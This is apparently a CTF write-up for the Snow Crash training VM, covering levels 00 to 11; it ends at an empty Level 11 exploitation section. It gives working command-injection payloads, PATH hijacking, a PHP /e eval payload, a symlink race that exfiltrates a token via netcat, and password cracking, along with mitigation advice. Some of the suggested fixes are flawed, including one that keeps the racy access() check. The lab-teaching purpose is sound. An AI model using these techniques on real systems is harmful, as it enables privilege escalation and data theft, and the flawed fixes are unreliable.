# snow-crash
## Overview
This repository contains the source code and resources for the "Snow Crash" Capture The Flag (CTF) challenge.
The challenge is designed to test participants' skills in various areas of cybersecurity, 
including reverse engineering, cryptography, web exploitation, and binary exploitation.

## requirements
- `SnowCrash.iso`: The ISO file for the Snow Crash VM. (This ressource is not included in the repository you can ask for.)
- Docker: The CTF environment is containerized using Docker, so you will need to have Docker installed on your machine to run the challenge.
- QEMU: To run the Snow Crash VM, you will need to have QEMU installed on your machine.
    ``` bash
    # For Debian/Ubuntu-based systems:
    sudo apt-get update
    sudo apt-get install qemu qemu-kvm
    ```



## Utils
### `Makefile`: 
This file contains a set of commands to manage the CTF environment using Docker. 
It includes targets for building the Docker image, starting and stopping the container, and cleaning up resources.
#### Commands:
- `make ctf_build`: Builds the Docker image for the CTF environment.
- `make ctf_up`: Starts the Docker container for the CTF environment.
- `make ctf_down`: Stops the Docker container for the CTF environment.
- `make ctf_clean`: Removes the Docker container for the CTF environment.
- `make ctf_clean_all`: Prunes all unused Docker resources, including images, containers, networks, and volumes.

### Find the ssh port snow-crash VM is listening on:
1. If is bridge networking:
```bash
    # run the following command on the host machine to find the Port number the Snow Crash VM is listening on:
    nmap -p- <VM_IP_ADDRESS> #on the VM run `ip a` to find the IP address
```
2. If is NAT networking:
```bash
    cat /etc/ssh/sshd_config | grep Port #on the VM run the above command to find the Port number the Snow Crash VM is listening on
    ss -tuln | grep <Port_number> #on the VM run the above command to confirm that the Snow Crash VM is listening on the specified port
``` 


### Running the Snow Crash VM with QEMU:
```bash
    qemu-system-x86_64 -hda snow-crash.qcow2 -m 2048 -net user,hostfwd=tcp::<hostPort>-:<guestPort> -net nic -nographic
```
Replace `<hostPort>` and `<guestPort>` with the appropriate port numbers for your setup.
#### Commands:
- `make run`: Runs the Snow Crash VM with the specified qemu configuration.
#### SSH Access:
- To access the Snow Crash VM via SSH from your host machine, use the following command:
```bash
    ssh user@localhost -p <hostPort>
```
Replace `<hostPort>` with the port number you specified in the qemu command for port forwarding.


- To access the Snow Crash VM via SSH from the Docker container, use the following command:
```bash
    # If NAT networking is used: 
    ssh user@<HostMachineIP> -p <hostPort>
    # If bridge networking is used:
    ssh user@<VM_IP_ADDRESS> -p <Port_number>
    # to find the IP address run the following command:
    ifconfig #or
    ip a
```
Replace `<HostMachineIP>` with the IP address of the host machine and `<hostPort>` with the port number you specified in the qemu command for port forwarding.

### Level00:
- use **find** to search everything related to the flag00 user in the SnowCrash machine where level00 has rights:
```bash
    RESULT=$(find / -user flag00 2>/dev/null)
    echo $RESULT
```
- we find two files:
    - /usr/sbin/john 
    - /rofs/usr/sbin/john
    - The both files contains the same string: `cdiiddwpgswtgt` which is Caesar code with a shift of 11
    - so we can decode it to get :  `nottoohardhere` using the script in file `level00/ressources/caesar_decode.sh`:
```bash
    # run the following command to decode the string:
    bash level00/ressources/caesar_decode.sh
    # the output will be:
    Decoded content: nottoohardhere
```
- This code is the password for the user flag00, so we can use it to swap to the user flag00 and get the flag for level01:

```bash
    su flag00
    # enter the password: nottoohardhere
    # then run the following command to get the flag for level01:
    getflag
```
- The flag for level01 is: `the result of getflag` which is in the file `level00/flag`

### Level01:
- Swap to the user flag01 and enter the password which is the flag for level01:
```bash
    su flag01
    # enter the password: the result of getflag
```
- Find the password for the user flag01:
```bash
    PASSWORD=$(cat /etc/passwd | grep flag01 | awk -F: '{print $2}')
    echo $PASSWORD
```
- We get this string: `42hDRfypTqqnw` 
- We use john the ripper to decode this string and get the password for the user flag01:
```bash
    # The script is in the file `level01/ressources/john_the_ripper.sh`
    bash level01/ressources/john_the_ripper.sh
    # the output will be:
    Password for flag01: abcdefg
```
- swap to the user flag01 using the password we just found and get the flag for level02:
```bash
    su flag01
    # enter the password: abcdefg
    # then run the following command to get the flag for level02:
    getflag
```
- The flag for level02 is: `the result of getflag` which is in the file `level01/flag`

### Level02:
- Swap to the user level02 and enter the password which is the flag for level01:
```bash
    su level02
    # enter the password: the result of getflag
```
- In the home directory of the user level02 we find a file named `flag02.pcap`
which is a packet capture file that contains network traffic data.
like below:
```bash
    level02@SnowCrash:~$ ls -l
    total 12
    ----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
```
- we can analyze this file using Wireshark or tshark to find the flag for level03:
```bash
    # To analyze the file using tshark, run the following command:
    tshark -r level02.pcap -z follow,tcp,ascii,0
```
- We get the password for the user flag02 which is: `the result of the above command`
- swap to the user flag02 using the password we just found and get the flag for level03:
```bash
    su flag02
    # enter the password: the result of the above command
    # then run the following command to get the flag for level03:
    getflag
```
- The flag for level03 is: `the result of getflag` which is in the file `level02/flag`
### Level03:
- Swap to the user level03 and enter the password which is the flag for level02:
```bash    
    su level03
    # enter the password: the result of getflag
```
- In the home directory of the user level03 we find a file named `flag03` 
```bash 
    level03@SnowCrash:~$ ls -l
    total 12
    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
    level03@SnowCrash:~$ ./level03 
    Exploit me
```
- This file is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag03**.
- We can decompile this binary using objdump if you can read assembly code:
```bash
    objdump -d level03
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash
    # i use this platform to decompile the binary: 
    https://dogbolt.org/
```
- We get something like this :
```c
    int32_t main(int argc, char** argv, char** envp)
    {
        gid_t eax = getegid();
        uid_t eax_1 = geteuid();
        setresgid(eax, eax, eax);
        setresuid(eax_1, eax_1, eax_1);
        return system("/usr/bin/env echo Exploit me");
    }
```

#### Analysis:
- The binary is using the `getegid()` and `geteuid()` functions to get the **effective group ID** and **effective user ID** of the process, which are the IDs (flag03) of the user that executed the binary (in this case, any user that executes the binary will have the effective IDs of the user flag03).
- Then it uses the `setresgid()` and `setresuid()` functions to set the real, effective, and saved group ID and user ID of the process to the values obtained from `getegid()` and `geteuid()`, which means that the process will run with the privileges of the user flag03.
- Finally, it uses the `system()` function to execute the command `echo Exploit me` with the privileges of the user flag03.

#### Vulnerability:
##### Type: Command Injection
- The vulnerability in this binary is that it uses the combination of `setresgid()`, `setresuid()`, and `system()` functions without properly sanitizing the **environment variables** (e.g., `PATH`) or/and the command being executed.
- This allows an attacker to manipulate the environment variables or the command being executed to execute arbitrary commands with the privileges of the user flag03, which can lead to privilege escalation and potentially compromise the entire system if the user flag03 has high privileges.


#### Exploitation:
- To exploit this binary, we can create a malicious script that will be executed by the `system()` function with the privileges of the user flag03. 
- We can create a script named `echo` with the following content:
```bash
    #!/bin/bash
    # This script will be executed with the privileges of the user flag03
    # We can use it to run the getflag to get the flag for level04
    echo "getflag" > /tmp/echo
    chmod +x /tmp/echo
    export PATH=/tmp:$PATH
    ./level03
    # Result is the flag for level04 which is in the file `level03/flag`
```
#### Prevention:
- To prevent this type of vulnerability, the binary should properly sanitize the environment variables and the command being executed. 
- For example, it should use an absolute path for the command being executed (e.g., `/usr/bin/env`) and should not allow the user to manipulate the `PATH` environment variable. 
- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.

#### conclusion:
- By exploiting the vulnerability in the `level03` binary, we can execute arbitrary commands with the privileges of the user flag03, which allows us to get the flag for level04 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing environment variables and commands when developing software, especially when dealing with privileged operations, to prevent potential security vulnerabilities and protect the integrity of the system.

### Level04:
- Swap to the user level04 and enter the password which is the flag for level03:
```bash
    su level04
    # enter the password: the result of getflag stored in level03/flag
```
- In the home directory of this user we find this file:
```bash
    level04@SnowCrash:~$ la -la
    -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
    level04@SnowCrash:~$ cat level04.pl
```
```perl
    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
        $y = $_[0];
        print `echo $y 2>&1`;
    }
    x(param("x"));
```
- The CGI script is likely being served by a web server, and it listens on port 4747, so we can access it through a web browser or a tool like `curl` to send requests to the server.
- This is a simple Perl script that takes a parameter from the URL and prints it out. However, it is vulnerable to command injection because it directly executes the input through the `backtick operator` **( \`  \` )** as a shell command without any sanitization.
- The `param("x")` function retrieves the value of the `x` parameter from the URL query string, and then it is passed to the `echo` command, which is executed in the shell.

##### Type: Command Injection
- The vulnerability in this script is that it allows an attacker to inject arbitrary commands through the `x` parameter in the URL. 
- For example, an attacker could access the URL `http://localhost:4747/?x=;ls` to execute the `ls` command on the server, which would list the files in the current directory. 
- This could lead to further exploitation if the attacker can access sensitive files or execute more complex commands.
#### Exploitation:
- To exploit this vulnerability, we can use a web browser or a tool like `curl` to send a request to the server with a malicious payload in the `x` parameter. 
- For example, we can give value to x as `test` to see the output of the command `echo test`:
```bash
    curl "http://localhost:4747/?x=test"
    # The output will be:
    test
```
- Also, we can try to execute a more complex command, such as `ls -all` to list the files in the current directory:
```bash
    curl --get --data-urlencode "x=;ls -all" http://localhost:4747
    # The output will be the list of files in the current directory
    total 4
    dr-xr-x---+ 2 flag04 level04  60 Mar 19 14:14 .
    drwxr-xr-x  1 root   root    100 Mar 19 14:14 ..
    -r-xr-x---+ 1 flag04 level04 152 Mar 19 14:14 level04.pl
```
-Now, we can execute the `getflag` command to get the flag for level05:
```bash
    curl --get --data-urlencode "x=;getflag" http://localhost:4747
    # The output will be the flag for level05 which is in the file `level04/flag`
```
#### Prevention:
- Use the backtick operator ( \`  \` ) to execute commands in Perl is dangerous because it allows for command injection if the input is not properly sanitized.
- To prevent this type of vulnerability, the script should properly sanitize the input from the `x` parameter to ensure that it does not contain any malicious commands. 
- This can be done by using a whitelist of allowed commands or by escaping special characters that could be used for command injection.
- ***Good practice***: it is generally recommended to avoid using the backtick operator for executing commands and instead use a more secure method, such as the `system()` function with proper argument handling, to reduce the risk of command injection.
```perl
    # Example of using system() with proper argument handling:
    use IPC::System::Simple qw(system);
    sub x {
        my $y = param("x");
        # Validate or sanitize $y here before using it
        # Use the absolute path for the command to prevent PATH manipulation
        # separate the command and its arguments to prevent command injection
        system("/usr/bin/echo", $y);
    }
```
#### Conclusion:
- By exploiting the command injection vulnerability in the `level04.pl` script, we can execute arbitrary commands on the server with the privileges of the user flag04, which allows us to get the flag for level05 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing user input and avoiding the use of dangerous functions that can lead to command injection vulnerabilities, especially when dealing with web applications that can be accessed by untrusted users.

### Level05:
- Swap to the user level05 and enter the password which is the flag for level04:
```bash
    su level05
    # enter the password: the result of getflag stored in level04/flag
```
- There is no file in the home directory of the user level05, but we can see that there is a process running with the name `level05`:
```bash
    RESULT=$(find / -user flag05 2>/dev/null)
    echo $RESULT
```
- The output will be something like this:
    - /usr/sbin/openarenaserver 
    - /rofs/usr/sbin/openarenaserver

```bash
    level05@SnowCrash:~$ cat $RESULT
    #!/bin/sh

    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done
    cat: /rofs/usr/sbin/openarenaserver: Permission denied
```
- This script is executed with the privileges of the user flag05, and it executes all the scripts in the directory `/opt/openarenaserver/` with a time limit of 5 seconds for each script. 
- The script also removes each script after executing it, which means that we can potentially inject our own scripts into this directory and have them executed with the privileges of the user flag05.
- To exploit this, we can create a malicious script that will be executed by the `openarenaserver` script with the privileges of the user flag05. 
- We can create a script named `exploit.sh` with the following content:
```bash
    #!/bin/bash
    # This script will be executed with the privileges of the user flag05
    # We can use it to run the getflag to get the flag for level06
    echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
    chmod +x /opt/openarenaserver/exploit.sh
```
- Now, we need to wait for the `openarenaserver` script to execute our `exploit.sh` script, which will run the `getflag` command and save the output to `/tmp/flag`.
- After a few seconds, we can check the contents of `/tmp/flag` to get the flag for level06:
```bash
    cat /tmp/flag
    # The output will be the flag for level06 which is in the file `level05/flag`
```
#### Prevention:
- To prevent this type of vulnerability, the `openarenaserver` script should not execute scripts from a directory (a public directory) that is writable by untrusted users, or it should properly sanitize the scripts before executing them.
- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.
- It is also important to ensure that the directory where the scripts are located has proper permissions set to prevent unauthorized users from adding or modifying scripts.
```bash
    # Example of setting proper permissions for the directory:
    chmod 750 /opt/openarenaserver
    chown root:flag05 /opt/openarenaserver
```
#### Conclusion:
- By exploiting the vulnerability in the `openarenaserver` script, we can execute arbitrary commands with the privileges of the user flag05, which allows us to get the flag for level06 and progress through the CTF challenge. 
- This highlights the importance of properly securing directories and scripts that are executed with elevated privileges to prevent potential security vulnerabilities and protect the integrity of the system. 

### Level06:
- Swap to the user level06 and enter the password which is the flag for level05:
```bash    
    su level06
    # enter the password: the result of getflag stored in level05/flag
```
- we can list the home directory of the user level06 to see if there are any files or directories that we can access:

```bash
    level06@SnowCrash:~$ ls -la level06*
    -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
    -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
``` 

- In the home directory of this user we find a file named `level06` which is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag06**.
- There is also a file named `level06.php` which is a PHP script that contains the following code:
```php
    <?php
        function x($y, $z)
        {
            $a = file_get_contents($y); 
            $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
            $a = preg_replace("/\[/", "(", $a); 
            $a = preg_replace("/\]/", ")", $a); return $a; 
        }
        $r = x($argv[1], $argv[2]); print $r;
    ?>
```
#### Analysis
- The `level06.php` script defines a function `x` that takes two arguments, `$y` and `$z`.
- The function reads the contents of the file specified by `$y` using `file_get_contents()`.
- It then uses `preg_replace()` with the `/e` modifier to evaluate the replacement as PHP code. This is a critical vulnerability because it allows for arbitrary code execution if the input is not properly sanitized.
- The function also replaces `[` with `(` and `]` with `)`, which suggests that it is trying to convert some kind of custom syntax into valid PHP code.
- The script then calls the function `x` with the first and second command-line arguments and prints the result.

#### Vulnerability
- The vulnerability in this script is that it allows for arbitrary code execution through the use of the
`/e` modifier in `preg_replace()`.
- An attacker can craft a malicious input that will be evaluated as PHP code, which can lead to a full compromise of the system if the attacker can execute arbitrary commands with the privileges of the user
flag06.

#### Exploitation
- To exploit this vulnerability, we can create a malicious file that will be read by the `file_get_contents()` function and contain the payload that we want to execute.
- For example, we can create a file named `/tmp/exploit.txt` with the following content:
```bash
    echo '[x ${`getflag`}]' > /tmp/exploit.txt
```
- This payload will execute the `getflag` command and save the output in the variable that will be evaluated by the `preg_replace()` function.

- We can then run the `level06.php` script with the path to our payload file as the first argument:
```bash
    php level06.php /tmp/exploit.txt
```
- The output will be the flag for level07 which is in the file `level06/flag`.


#### Prevention
- To prevent this type of vulnerability, the script should not use the `/e` modifier in `preg_replace()` and should properly sanitize any input that is used in the replacement string.
- Additionally, it should use a more secure method for executing commands, such as `exec()` or `shell_exec()`, with proper argument handling to reduce the risk of command injection.
- It is also important to ensure that any files that are read by the script are properly secured and do not contain malicious content that could be executed.

### level07:
#### Investigation
- Swap to the user level07 and enter the password which is the flag for level06:
```bash
    su level07
    # enter the password: the result of getflag stored in level06/flag
```
- We can list the home directory of the user level07 to see if there are any files or directories that we can access:
```bash
    level07@SnowCrash:~$ ls -la level07 
    -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
- In the home directory of this user we find a file named `level07` which is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag07**.

-  We can decompile this binary using objdump if you can read assembly code:
```bash
    objdump -d level07
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash
    # i use this platform to decompile the binary:
    https://dogbolt.org/
```
- We get something like this:
```c
    int32_t main(int argc, char** argv, char** envp)
    {
        gid_t eax = getegid();
        uid_t eax_1 = geteuid();
        setresgid(eax, eax, eax);
        setresuid(eax_1, eax_1, eax_1);
        char* var_1c = nullptr;
        asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
        return system(var_1c);
    }

```
#### Analysis
- The binary is using the `getegid()` and `geteuid()` functions to get the effective group ID and effective user ID of the process, which are the IDs of the user that executed the binary (in this case, any user that executes the binary will have the effective IDs of the user flag07).
- Then it uses the `setresgid()` and `setresuid()` functions to set the real, effective, and saved group ID and user ID of the process to the values obtained from `getegid()` and `geteuid()`, which means that the process will run with the privileges of the user flag07.
- Finally, it uses the `asprintf()` function to create a command string that includes the value of the `LOGNAME` environment variable, and then it uses the `system()` function to execute that command with the privileges of the user flag07.

#### Vulnerability
- The vulnerability in this binary is that it uses the `system()` function to execute a command that includes user-controlled input from the `LOGNAME` environment variable without proper sanitization.
- This allows an attacker to manipulate the `LOGNAME` environment variable to execute arbitrary commands with the privileges of the user flag07, which can lead to privilege escalation and potentially compromise the entire system if the user flag07 has high privileges.

#### Exploitation
- To exploit this binary, we can set the `LOGNAME` environment variable to a malicious
payload that will be executed by the `system()` function with the privileges of the user flag07.
- For example, we can set `LOGNAME` to `$(getflag)` to execute
the `getflag` command and get the flag for level08:
```bash
    export LOGNAME='$(getflag)'
    ./level07
    # The output will be the flag for level08 which is in the file `level07/flag`
```
#### Prevention
- To prevent this type of vulnerability, the binary should properly sanitize the input from the `LOGNAME` environment variable to ensure that it does not contain any malicious commands.
- This can be done by using a whitelist of allowed values for the `LOGNAME` variable or by escaping special characters that could be used for command injection.
- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.
```c
    // Example of using execve() with proper argument handling:
    char* var_1c = nullptr;
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    // Validate or sanitize var_1c here before using it
    char* args[] = {"/bin/echo", getenv("LOGNAME"), nullptr};
    execve("/bin/echo", args, envp);
```
#### Conclusion
- By exploiting the vulnerability in the `level07` binary, we can execute arbitrary commands with the privileges of the user flag07, which allows us to get the flag for level08 and progress through the CTF challenge. 
- This highlights the importance of properly sanitizing environment variables and using secure methods for executing commands to prevent potential security vulnerabilities and protect the integrity of the system.    


### Level08:
#### Investigation
- Swap to the user level08 and enter the password which is the flag for level07:
```bash    
    su level08
    # enter the password: the result of getflag stored in level07
```

- List the home directory of the user level08 to see if there are any files or directories that we can access:
```bash
    level08@SnowCrash:~$ ls -la 
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
- In the home directory of this user we find a file named `level08` which is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag08**.

- There is also a file named `token`, whitch is not readable by the user level08 but it is owned by the user flag08, so we can try to read it using the `level08` binary which runs with the privileges of the user flag08:
```bash
    level08@SnowCrash:~$ ./level08 token 
    #You may not access 'token'

```
- The output indicates that we do not have permission to access the `token` file, which suggests that the `level08` binary has some kind of access control mechanism in place to prevent unauthorized access to certain files.
- We can try to analyze the `level08` binary to understand how it works and see if there are any vulnerabilities that we can exploit to gain access to the `token` file.
- We can decompile this binary using objdump if you can read assembly code:
```bash
    objdump -d level08
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash
    # i use this platform to decompile the binary:
    https://dogbolt.org/
```
- We get something like this:
```c
    ...
    if (strstr(argv[1], "token"))
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }
    ...
```

#### Analysis:
- The binary checks if the argument passed to it contains the string "token". If it does, it prints a message saying "You may not access 'token'" and exits with a status of 1, which indicates an error. This means that the binary is explicitly designed to prevent access to the `token` file when the argument contains the string "token".

- However, the check is done using `strstr()`, which checks for the presence of the substring "token" anywhere in the argument. This means that if we can pass an argument that does not contain the substring "token" but still allows us to access the `token` file, we might be able to bypass this check.

#### Exploitation:
- To exploit this, we can try to use a symbolic link to create a file that does not contain the substring "token" but points to the `token` file. 
- We can create a symbolic link named `/tmp/exploit` that points to the `token` file:
```bash
    level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
```
- Now, we can try to access the `/tmp/exploit` file using the `level08` binary:
```bash
    level08@SnowCrash:~$ ./level08 /tmp/exploit
    # The output will be the contents of the token file, which is the password for the user flag09
```
- By using the symbolic link, we were able to bypass the check for the substring "token" and access the contents of the `token` file, which contains the flag for level09.

- Switch to the user flag09 using the password we just found and get the flag for level09:
```bash
    su flag09
    # enter the password: the result of the above command
    # then run the following command to get the flag for level09:
    getflag
```
- The flag for level09 is: `the result of getflag` which is in the file `level08/flag`

#### Prevention:
- To prevent this type of vulnerability, the binary should use a more secure method for checking access to files, such as checking the file permissions directly or using a whitelist of allowed files instead of relying on substring checks.
- Additionally, it should ensure that symbolic links cannot be used to bypass access controls by checking the real path of the file being accessed and comparing it against a list of allowed paths.
```c
    // Example of checking the real path of the file:
    char real_path[PATH_MAX];
    realpath(argv[1], real_path);
    if (strcmp(real_path, "/home/flag08/token") == 0)
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }
```

#### Conclusion:
- By exploiting the vulnerability in the `level08` binary, we were able to bypass the
access control mechanism and access the contents of the `token` file, which allowed us to get the flag for level09 and progress through the CTF challenge.
- This highlights the importance of using secure methods for access control and ensuring that checks are not easily bypassed by attackers, especially when dealing with sensitive files that contain flags or other important information in CTF challenges.


### Level 09:
- Swap to the user level09 and enter the password which is the flag for level08:
```bash
    su level09
    # enter the password: the result of getflag stored in level08/flag
```
- List the home directory of the user level09 to see if there are any files or directories that we can access:
```bash
    level09@SnowCrash:~$ ls -la 
    -rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09
    ----r--r-- 1 flag09  level09   26 Mar  5  2016 token
```

- In the home directory of this user we find a file named `level09` which is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag09**.

- There is also a file named `token` which is readable by the user level09 and contains :
```bash
    cat token
    # The output will be : f4kmm6p|=�p�n��DB�Du{��
```
- The `token` file contains a string that appears to be encoded or encrypted.
- Executing the `level09` binary does not provide any useful output, which suggests that it may be designed to perform some kind of decoding or decryption of the contents of the `token` file when executed with the privileges of the user flag09.

```bash
    level09@SnowCrash:~$ ./level09 
    # output: You need to provied only one arg.
    level09@SnowCrash:~$ ./level09 token 
    # output: tpmhr
```

- When we execute the `level09` binary with the `token` file as an argument, it outputs `tpmhr`, which suggests that the binary is performing some kind of transformation on the contents of the `token` file.

- Let's decompile the `level09` binary to understand how it works and see if we can reverse the transformation to get the original string from the `token` file.
- We can decompile this binary using objdump if you can read assembly code:
```bash
    objdump -d level09
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash
    # i use this platform to decompile the binary:
    https://dogbolt.org/
```
- We get something like this:
```c
    ...
    while ( ++v4 < strlen(argv[1]) )
        putchar(v4 + argv[1][v4]);
    return fputc(10, stdout);
    ...
```
#### Analysis:
- The binary is iterating through each character of the input string (in this case, the contents of the `token` file) and applying a transformation to it by adding the index of the character to its ASCII value before printing it out.
- This means that to reverse the transformation, we need to subtract the index of each character from its ASCII value to get the original string.

```
    original[i] = token[i] - i;
```

#### Vulnerability: 
##### Type: Weak Encoding
- The vulnerability in this binary is that it does not properly handle the transformation of the input string, which allows an attacker to reverse the transformation and get the original string from the `token` file, which contains the password for the user flag10.
- This is a weak encoding scheme that can be easily reversed, and it does not provide any real security for the contents of the `token` file.

#### Exploitation:

- We can write a simple script to reverse the transformation and get the original string from the `token` file:
```c 
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) 
    {
        int fd = open(argv[1], O_RDONLY);
        char token[256];
        read(fd, token, sizeof(token));
        char original[sizeof(token)];
        for (int i = 0; i < strlen(token); i++) {
            original[i] = token[i] - i;
        }
        original[strlen(token)] = '\0'; // Null-terminate the string
        printf("Original string: %s\n", original);
        return 0;
    }
```
- When we run this script, it will output the original string that was transformed by the `level09` binary, which is the flag for level10.
```bash
    # Compile and run the script:
    gcc reverse_transform.c -o reverse_transform
    ./reverse_transform token
    # The output will be the original string, which is the flag for level10
```
- Switch to the user flag10 using the password we just found and get the flag for level10:
```bash    
    su flag10
    # enter the password: the result of the above command
    # then run the following command to get the flag for level10:
    getflag
```
- The flag for level10 is: `the result of getflag` which is in the file `level09/flag`

#### Prevention:
- To prevent this type of vulnerability, the binary should use a stronger encoding or encryption scheme for the contents of the `token` file that cannot be easily reversed by an attacker.
- Additionally, it should ensure that the transformation applied to the input string is not easily reversible and does not rely on simple arithmetic operations that can be easily undone.
- It is also important to ensure that sensitive information, such as passwords or flags, is not stored in a way that can be easily accessed or decoded by attackers.

### Level 10:
- Swap to the user level10 and enter the password which is the flag for level09:
```bash
    su level10
    # enter the password: the result of getflag stored in level09/flag
```
- List the home directory of the user level10 to see if there are any files or directories that we can access:
```bash
    level10@SnowCrash:~$ ls -la
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
- In the home directory of this user we find a file named `level10` which is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag10**.
- There is also a file named `token` which is not readable by the user level10 but it is owned by the user flag10, so we can try to read it using the `level10` binary which runs with the privileges of the user flag10:
```bash
    level10@SnowCrash:~$ ./level10 token 
    #output :
    #./level10 file host
    #sends file to host if you have access to it
    level10@SnowCrash:~$ ./level10 token  localhost
    #You don't have access to token
```
- The output indicates that we do not have permission to access the `token` file, which suggests that the `level10` binary has some kind of access control mechanism in place to prevent unauthorized access to certain files.
- However, the binary also indicates that it can send files to a specified host if we have access to them. This suggests that there may be a way to exploit this functionality to gain access to the contents of the `token` file.
- We can try to analyze the `level10` binary to understand how it works and see if there are any vulnerabilities that we can exploit to gain access to the `token` file.
- We can decompile this binary using objdump if you can read assembly code:
```bash    objdump -d level10
```
- Or we can use a tool like Ghidra to decompile the binary and analyze it
```bash    # i use this platform to decompile the binary:
    https://dogbolt.org/
```
- We get something like this:
```c
    ...
    if (access(argv[1], 4) == -1)
    {
        printf("You don't have access to %s\n", argv[1]);
        exit(1);
    }
    open(argv[1], O_RDONLY);
    ...
    // Code to send the file to the specified host
    ...
```

#### Analysis:
- The binary checks if the user has read access to the specified file (in this case,the `token` file) using the `access()` function. If the user does not have access, it prints a message and exits. If the user does have access, it opens the file for reading and then proceeds to send the file to the specified host.
- The vulnerability in this binary is that it does not properly handle the access control for the specified file, which allows an attacker to potentially gain access to the contents of the `token` file by exploiting the functionality to send files to a specified host.
- If we can trick the binary into sending the contents of the `token` file to a host that we control, we can capture the contents of the file and get the flag for level11.

#### Vulnerability: 
#### Type: Insecure File Handling
- The vulnerability in this binary is that it allows an attacker to send the contents of a file that they do not have access to by exploiting the functionality to send files to a specified host.  

#### Exploitation:
- To exploit this, we can set up a simple server on our local machine to listen for incoming connections and capture the contents of the file being sent by the `level10` binary.
- We can use `netcat` to set up a listener on a specific port:
```bash    
    nc -l -p 6969 > captured_token
```
- Use link to create a symbolic link to the `token` file in a location that we have access to
```bash
    while true; do
        rm -f /tmp/x
        ln -s /home/user/level10/token /tmp/x
        rm -f /tmp/x
        echo test > /tmp/x
    done
```
- Send the symbolic link to the `level10` binary to trigger the file sending functionality:
```bash
    while true; do
        ./level10 /tmp/x 127.0.0.1
    done
```
- The `level10` binary will attempt to send the contents of the `token` file to our local server, and we can capture it in the `captured_token` file.
- After a few seconds, we can check the contents of the `captured_token` file
```bash
    cat captured_token
    # The output will be the contents of the token file, which is the password for the user flag11
```
- Switch to the user flag11 using the password we just found and get the flag for level11:
```bash    
    su flag11
    # enter the password: the result of the above command
   # then run the following command to get the flag for level11:
    getflag
```

- The flag for level11 is: `the result of getflag` which is in the file `level10/flag`

#### Prevention:
- To prevent this type of vulnerability, the binary should properly handle access control for files and ensure that users cannot send files that they do not have access to.
- This can be done by implementing stricter access control checks and ensuring that the functionality to send files is only available for files that the user has permission to access.
- Additionally, it should ensure that any files being sent are properly sanitized and that the destination host is verified to prevent potential abuse of the file sending functionality.
```c
    // Example of implementing stricter access control checks:
    if (access(argv[1], 4) == -1)
    {
        printf("You don't have access to %s\n", argv[1]);
        exit(1);
    }
    // Verify the destination host before sending the file
    if (!is_valid_host(argv[2])) {
        printf("Invalid destination host: %s\n", argv[2]);
        exit(1);
    }
    // Code to send the file to the specified host
```
#### Conclusion:
- By exploiting the vulnerability in the `level10` binary, we were able to capture the contents of the `token` file, which allowed us to get the flag for level11 and progress
through the CTF challenge.
- This highlights the importance of properly handling file access and ensuring that functionalities that allow users to send files are secure and do not allow for abuse by attackers, especially when dealing with sensitive information such as flags in CTF challenges.

### Level 11:
- Swap to the user level11 and enter the password which is the flag for level10:
```bash
    su level11
    # enter the password: the result of getflag stored in level10/flag
```
- List the home directory of the user level11 to see if there are any files or directories
that we can access:
```bash
    level11@SnowCrash:~$ ls -la
    -rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```
- Cat the `level11.lua` file to see its contents:
```lua
    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151))

    function hash(pass)
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
    end

```
#### Analysis:

- This code opens a socket server that listens on localhost at port 5151. It defines a function `hash` that takes a password as input, hashes it using the SHA-1 algorithm, and returns the first 40 characters of the hash.
- The vulnerability in this code is that it uses the `io.popen()` function to execute a shell command that includes user input (the password) without proper sanitization. This allows for command injection if an attacker can control the input to the `hash` function. An attacker could potentially execute arbitrary commands on the server by crafting a malicious password that includes shell commands, which could lead to a full compromise of the system if the attacker can execute commands with the privileges of the user flag11.

#### Vulnerability:
##### Type: Command Injection
- The vulnerability in this code is that it allows for command injection through the use of the `io.popen()` function, which executes a shell command that includes user input without proper sanitization.
#### Exploitation:
